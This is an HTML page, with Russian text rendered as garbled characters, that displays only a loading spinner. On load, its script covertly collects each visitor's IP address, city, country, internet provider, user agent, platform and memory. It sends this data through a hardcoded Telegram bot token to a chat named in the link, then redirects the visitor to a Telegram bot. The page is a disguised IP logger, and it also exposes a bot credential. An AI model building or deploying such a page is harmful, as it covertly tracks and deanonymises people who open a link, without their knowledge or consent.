<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ó–∞–≥—Ä—É–∑–∫–∞...</title>
    <style>
        body {
            background-color: #000;
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: Arial, sans-serif;
            color: white;
        }
        
        .loading {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #fff;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading">
        <div class="spinner"></div>
        <p> </p>
    </div>

    <script>
        // –ü–æ–ª—É—á–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∏–∑ URL
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('tg');
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è IP —á–µ—Ä–µ–∑ —Å—Ç–æ—Ä–æ–Ω–Ω–∏–π —Å–µ—Ä–≤–∏—Å
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    country: data.country_name,
                    provider: data.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                };
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏:', error);
                return {
                    ip: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    city: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    country: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    provider: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                };
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–ª–∞—Ç—Ñ–æ—Ä–º–µ –∏ –ø–∞–º—è—Ç–∏
        function getPlatformInfo() {
            const platform = navigator.platform;
            const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
            
            return {
                platform,
                memory
            };
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram –±–æ—Ç–∞
        async function sendToTelegram(message) {
            const botToken = '8486936966:AAHaDit7xT6HT6I13C-U-CjAh-m4PMenqYo';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
                return false;
            }
        }
        
        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏
        function formatTime(date) {
            const options = {
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                timeZoneName: 'short'
            };
            return date.toLocaleString('ru-RU', options);
        }
        
        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
        async function init() {
            // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ
            const ipInfo = await getIPInfo();
            const platformInfo = getPlatformInfo();
            const userAgent = navigator.userAgent;
            const currentTime = formatTime(new Date());
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
            const message = `
üîê <b>–ù–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ</b>

üåê <b>IP:</b> ${ipInfo.ip}
üè† <b>–ì–æ—Ä–æ–¥:</b> ${ipInfo.city}
üá∫üá≥ <b>–°—Ç—Ä–∞–Ω–∞:</b> ${ipInfo.country}
üì° <b>–ü—Ä–æ–≤–∞–π–¥–µ—Ä:</b> ${ipInfo.provider}

üõ†Ô∏è <b>User-agent:</b>
<blockquote>${userAgent}</blockquote>

üíª <b>–î—Ä—É–≥–∏–µ –¥–∞–Ω–Ω—ã–µ:</b>
<b>–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:</b> ${platformInfo.platform}
<b>–ü–∞–º—è—Ç—å:</b> ${platformInfo.memory}

üîó <b>–í–µ—á–Ω–∞—è —Å—Å—ã–ª–∫–∞:</b> FaidikSearch.xyz
‚åõ <b>–í—Ä–µ–º—è –ø–µ—Ä–µ—Ö–æ–¥–∞:</b> ${currentTime}
            `;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
            if (chatId) {
                await sendToTelegram(message);
            }
            
            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ –±–æ—Ç–∞
            setTimeout(() => {
                window.location.href = 'http://t.me/faidiappsbot';
            }, 2000);
        }
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = init;
    </script>
</body>
</html>
